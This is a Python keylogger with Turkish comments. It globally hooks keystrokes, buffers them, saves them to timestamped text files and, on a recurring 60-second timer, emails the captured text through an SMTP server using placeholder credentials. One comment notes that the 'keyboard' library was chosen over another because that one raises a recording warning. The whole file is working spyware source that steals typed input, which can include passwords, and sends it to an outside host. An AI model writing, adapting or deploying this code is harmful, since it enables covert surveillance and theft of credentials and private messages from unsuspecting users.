import keyboard #pynput kullanilabilir fakat "keyboard recording" uyarisi verir!
import smtplib
from threading import Timer
from datetime import datetime
import sifre

MAIL_USER = "MAIL ADDRESSINIZI GIRIN" 
MAIL_SIFRE = "MAIL SIFRENIZI GIRIN" 
MAIL_SMTP = "smtp.ethereal.email" #Ethereal Örnegidir
SMTP_PORT = 587 # Ethereal Portudur
RAPOR_SURE = 60 # loglarin mail ile atilma süresini düzenler


class Keylogger:
    def __init__(self, sure, rapor):
        self.sure = sure
        self.rapor = rapor
        self.log = ""
        self.baslangic = datetime.strftime(datetime.today() , '%d-%m-%Y-%Hh-%Mm')
        self.bitis = datetime.strftime(datetime.today() , '%d-%m-%Y-%Hh-%Mm')


    def tus_yakalama(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]"
            elif name == "tab":
                name = "[TAB]"
            elif name == "ctrl":
                name = "[CTRL]"
            elif name == "alt":
                name = "[ALT]"
            elif name == "backspace":
                name = "[SIL]"
            elif name == "shift":
                name = "[^]"
            elif name == "!":
                name = "[!]"
            elif name == "down":
                name = "[ALT_TUS]"
            elif name == "right":
                name = "[SAG_TUS]"
            elif name == "left":
                name = "[SOL_TUS]"
            elif name == "up":
                name = "[ÜST_TUS]"
        #elif name == " ":
            #name = "[BOSLUK]"  # BOSLUK YERINE [BOSLUK] YAZMASINI SAGLAR
        self.log += name


    def dosya_isimlendir(self):
        baslama_zamani = str(self.baslangic)
        bitis_zamani = str(self.bitis)
        self.dosya_adi = f"log{baslama_zamani}_{bitis_zamani}"

    def dosya_olustur(self):
        with open(f"{self.dosya_adi}.txt", "w+") as d:
            print(self.log, file=d)
        print(f"[+] Yeni girdi: {self.dosya_adi}.txt") # Terminalden cikti verir

    def mail_gonderme(self, icerik, mail=MAIL_USER, sifre=MAIL_SIFRE):
        server = smtplib.SMTP(host=MAIL_SMTP, port=SMTP_PORT)
        #TLS modunda sifreleme icin :
        server.starttls()
        server.login(mail, sifre)
        server.sendmail(mail,mail,icerik.encode('utf-8'))
        server.quit()

    def icerik(self):
        if self.log:
            self.dosya_isimlendir()
            self.dosya_olustur()
            if self.rapor == "mail":
                self.mail_gonderme(self.log, MAIL_USER,MAIL_SIFRE)
            elif self.rapor == "dosya":
                self.dosya_olustur() #yönlendirme eklenebilir
            print(f"[{self.dosya_adi} icine yazdirildi: {self.log}") # Terminalde yazdirilan loglari görme
            self.baslangic = datetime.strftime(datetime.today() , '%d-%m-%Y-%Hh-%Mm')

        zamanlayici = Timer(interval=RAPOR_SURE, function=self.icerik) # Multithread yapmasi icin zamanlayici döngü
        zamanlayici.daemon = True
        zamanlayici.start()
        self.log = ""

    def baslat(self):
        self.baslangic = datetime.strftime(datetime.today() , '%d-%m-%Y-%Hh-%Mm')
        keyboard.on_release(callback=self.tus_yakalama)
        self.icerik()
        keyboard.wait()

if __name__ == "__main__":
    logger = Keylogger(sure=RAPOR_SURE, rapor="mail")
    logger.baslat()
